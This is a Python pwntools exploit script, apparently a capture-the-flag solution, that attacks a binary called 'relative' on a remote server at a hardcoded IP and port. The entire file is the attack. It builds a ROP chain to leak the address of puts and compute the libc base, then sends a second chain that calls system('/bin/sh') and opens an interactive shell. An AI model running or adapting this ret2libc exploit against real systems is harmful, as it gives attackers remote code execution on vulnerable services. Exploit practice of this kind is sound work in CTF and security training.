from pwn import *


exe = ELF("relative")
libc = ELF("./libc.so.6")

rop = ROP(exe)

ADD_RSP = (rop.find_gadget(['add rsp, 8', 'ret']))[0]
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

context.binary = exe

r = remote("128.199.12.141", 7012)
# r = gdb.debug("./relative")
r.recvline()
payload = flat([
    p64(POP_RDI),
    p64(exe.got['puts']),
    p64(exe.symbols['puts']),
    p64(exe.symbols['main']),
    b"A" * 8
])
r.send(payload + p64(ADD_RSP)[:7])
libc.address = u64(r.recv(6).ljust(8,b'\x00')) - libc.symbols['puts'] 
log.info(f"found libc base @ {hex(libc.address)}")
payload = flat([
    p64(POP_RDI),
    p64(next(libc.search(b"/bin/sh"))),
    p64(libc.symbols['system']),
    p64(exe.symbols['main']),
    b"A" * 8
])
r.send(payload + p64(ADD_RSP))

r.interactive()
